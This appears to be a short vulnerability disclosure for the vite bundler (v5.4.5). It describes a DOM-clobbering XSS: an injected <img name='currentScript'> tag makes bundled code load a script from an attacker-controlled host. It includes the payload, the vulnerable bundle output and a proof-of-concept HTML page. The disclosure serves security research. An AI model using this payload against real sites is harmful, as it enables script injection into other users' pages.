## vite

### Meta

+ Library: vite
+ Version: v5.4.5
+ Stars: 67.2K
+ Payload: ```<img src="https://xxx.xxx.xxx" name="currentScript">```
+ Impact: XSS
+ CVE: N/A
+ Status: N/A
+ Foundby: TheHulk

### Library

URL: https://github.com/vitejs/vite
Bundlers run locally

### Vulnerable Code Snippet

```
npm install -D vite
node ./node_modules/vite/bin/vite.js build
```

Output:
```javascript
"use strict";var e=typeof document<"u"?document.currentScript:null,t=document.createElement("script");t.src=(typeof document>"u"?require("url").pathToFileURL(__filename).href:e&&e.src||new URL("assets/index-BQeycCZk.js",document.baseURI).href)+"extra.js";document.head.append(t);
```

## PoC

as an example, bundle the js below: `node ./node_modules/vite/bin/vite.js build`.

```javascript
var s = document.createElement('script')
s.src = import.meta.url + 'extra.js'
document.head.append(s)
```

example html:


```html
<!--Library-->
<script type="module" crossorigin src="index-BQeycCZk.js"></script>
<!--Library-->

<!--Payload-->
<img name="currentScript" src="//localhost:9999">
<!--Payload-->
```

